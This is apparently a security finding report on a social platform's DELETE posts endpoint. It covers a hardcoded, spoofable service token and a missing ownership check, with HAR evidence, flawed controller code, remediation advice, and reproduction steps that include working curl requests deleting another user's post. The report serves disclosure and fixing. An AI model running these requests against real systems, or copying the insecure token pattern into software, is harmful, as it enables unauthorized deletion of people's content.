## Findings

1. **Spoofable internal service token bypasses workflow gate on `DELETE /api/v1/posts/{id}`**: the `DeletionController` authenticates callers solely by checking that `X-Service-Token` equals the hardcoded static value `trust-service-a1b2c3d4e5f6` (RISK-TS-500 — token never rotated). Because this header is accepted from any source reaching the endpoint (including public internet callers through the Envoy edge proxy), any attacker who discovers the token value can impersonate the internal Moderation Service and trigger arbitrary post deletions without going through the required human-review workflow.

2. **Identity propagation drift — caller-supplied `X-Internal-User-ID` used as deletion authority without ownership check**: the controller reads `X-Internal-User-ID` from the HTTP request headers and passes it directly to `db.deletePost(postId, internalUserID)` without verifying that `internalUserID` is the owner of `postId`. The attacker sets `X-Internal-User-ID: user_8819X` (their own ID) and `postId` to `post_target_A` (a post belonging to `user_991B`). The service deletes the victim's post and writes the spoofed user ID into the `deletion_audit` table.

## Evidence

- **HAR DELETE request** (`startedDateTime: 2026-04-09T19:05:12.441Z`, elapsed 78 ms): `DELETE https://api.socialloop.com/api/v1/posts/post_target_A`; JWT encodes `sub: usr_8819X`, `role: MEMBER`; `x-service-token: trust-service-a1b2c3d4e5f6`; `x-internal-user-id: user_8819X`.
- **HAR response**: HTTP 200 OK, `x-deletion-time-ms: 21`; body `{"status": "Post deleted successfully", "post_id": "post_target_A"}` — irreversible content deletion confirmed.
- **Flawed controller code** (section 6.0): `if (!"trust-service-a1b2c3d4e5f6".equals(internalToken)) { return 401; }` — static token check, not mutual TLS or service-mesh identity. `String internalUserID = request.getHeader("X-Internal-User-ID")` — attacker-controlled header taken as authoritative. `db.deletePost(postId, internalUserID)` — no `WHERE author_user_id = internalUserID` ownership filter in the DELETE.
- **Audit corruption**: `auditLog.logDeletion("DELETION_SERVICE", postId, internalUserID)` writes `user_8819X` as the deletion initiator, which is accurate for attribution but provides no indication the deletion was illegitimate — the audit trail appears normal.
- **Workflow bypass**: section 3.2 states the Final Deletion Service is "only intended to be called by the Moderation Service" after explicit human approval. The HAR request originates from a MEMBER JWT, not from the Moderation Service queue — the entire two-step human-review workflow was skipped.

## Reproduction

Step 1 — confirm that the `X-Service-Token` is required:

```bash
curl -i -X DELETE "https://api.socialloop.com/api/v1/posts/post_target_A" \
  -H "Authorization: Bearer <JWT_user_8819X_MEMBER>" \
  -H "x-internal-user-id: user_8819X"
```

Expected: HTTP 401 `Unauthorized Service Token` (token missing).

Step 2 — inject the discovered service token and target a foreign user's post:

```bash
curl -i -X DELETE "https://api.socialloop.com/api/v1/posts/post_target_A" \
  -H "Authorization: Bearer <JWT_user_8819X_MEMBER>" \
  -H "x-service-token: trust-service-a1b2c3d4e5f6" \
  -H "x-internal-user-id: user_8819X"
```

Expected secure outcome: HTTP 403 — `post_target_A` is not owned by `user_8819X`, or the endpoint is inaccessible from public caller paths.  
Observed vulnerable outcome: HTTP 200 `{"status": "Post deleted successfully", "post_id": "post_target_A"}` — `user_991B`'s post permanently deleted.

## Remediation

- **Rotate and externalize the service token immediately (RISK-TS-500)**: the static, hardcoded token `trust-service-a1b2c3d4e5f6` must be rotated and replaced with a short-lived service-mesh mTLS identity (e.g., SPIFFE/SPIRE) or a server-side-generated OAuth client-credentials token not accessible from client-facing paths.
- **Strip internal headers at the Envoy edge proxy**: configure the Envoy edge proxy to strip `X-Service-Token` and `X-Internal-User-ID` from any inbound external request — these headers must only be injected by the Moderation Service within the trusted service mesh.
- **Add ownership check before deletion**: in `deletePost`, add a pre-delete ownership query — fetch the post, compare `author_user_id` against the requesting principal, and return 403 if they differ. The deletion SQL must include `WHERE post_id = postId AND author_user_id = authorizedOwner` as a hard guard.
- **Enforce workflow integrity**: the Final Deletion Service should only accept requests that carry a cryptographically signed moderation job token (issued by the Moderation Service for a specific post after human approval), not a generic static service token.
